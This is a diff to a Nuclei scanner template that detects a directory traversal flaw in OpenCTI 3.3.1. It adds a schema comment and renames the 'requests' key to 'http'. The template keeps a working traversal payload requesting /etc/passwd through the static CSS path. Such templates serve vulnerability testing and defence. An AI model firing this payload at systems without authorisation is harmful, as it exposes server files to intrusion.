@@ -1,3 +1,4 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: opencti-lfi
 info:
   name: OpenCTI 3.3.1 - Directory Traversal
@@ -5,7 +6,7 @@ info:
   severity: high
   reference: https://cxsecurity.com/issue/WLB-2020060078
   tags: opencti,lfi
-requests:
+http:
   - method: GET
     path:
       - "{{BaseURL}}/static/css//../../../../../../../../etc/passwd"
